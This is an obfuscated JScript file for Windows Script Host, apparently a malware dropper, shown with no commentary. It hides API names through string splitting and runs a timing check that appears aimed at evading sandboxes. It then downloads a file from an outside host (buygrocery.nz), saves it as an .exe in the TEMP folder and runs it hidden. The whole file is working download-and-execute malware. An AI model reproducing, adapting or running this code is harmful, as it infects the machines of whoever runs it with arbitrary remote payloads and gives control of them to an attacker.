var EI = false;
var T = "Create"+"Object";
var O0 = function MR() {return WScript[T]("WScript"+".Shell");}(), TM = 11;
var Z = "MSXML2"+".XMLHTTP";
var I = 2;
var LJ = I - 2;
function O(DH){O0["Run"](DH, LJ, LJ);};
function Q(){return Z + "";};
function SJ(Y2, I0){LJ = LJ * 1; return Y2 - I0;};
function UP(){return T;};
/*@cc_on
  @if (@_win32 || @_win64)
    EI = true;
  @end
@*/
if (EI)
{
var W = "";
function WO(){return 22;};
var H = 0; var AJ = 0;
function K()
{
var FY = new this["Date"]();
var R = FY["getUTCMilliseconds"]();
WScript["Sleep"](WO());
var FY = new this["Date"]();
var W0 = FY["getUTCMilliseconds"]();
WScript["Sleep"](WO());
var FY = new this["Date"]();
var Y0 = FY["getUTCMilliseconds"]();
var H = "WJ";
H = SJ(W0, R);
var AJ = "BB";
AJ = SJ(Y0, W0);
W = "open";
return SJ(H, AJ);
}
var IJ = false;
var T0 = false;
for (var TP = LJ; TP < WO() * 1; TP++){if (K() != LJ){
IJ = true; 
AJ = "31" + 11 * H + AJ; 
T0 = true; 
break;
}}
function CY() {return ((IJ == true) && (IJ == T0)) ? 1 : LJ;};
if (IJ && CY() && T0){
function Y() {return O0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "gc7EMfAOQOi6MK6.ex" + "e";};
 ZY = Q();
 Y1 = WScript[T](ZY);
 var N = 1;
do { 
	for (;N;){
	try {
		if (N == 1)
		{
			Y1[W]("GET", "http://buygrocery.nz/l7dsp", false);
			Y1["send"]();
			GK = "Sleep";
			N = 2;
		}
		WScript[GK](WO() + 120); 
		if (Y1["readystate"] < 2 * 2) continue;
		N = LJ;
		function X(OC) {var K0 = (1, 2, 3, 4, 5, OC); return K0;};
		QU = WScript[UP()]("ADODB.Stream");
		ZY = QU;
		ZY[W]();
		ZY["type"] = X(1);
		ZY["write"](Y1["ResponseBody"]);
		QU["position"] = X(LJ);
		ZY["Save" + "ToFile"](Y(), 2);
		QU["cl"+"ose"]();
		HI = Y();
		O(HI);
	} catch(G){};};
}while (N);
}
}

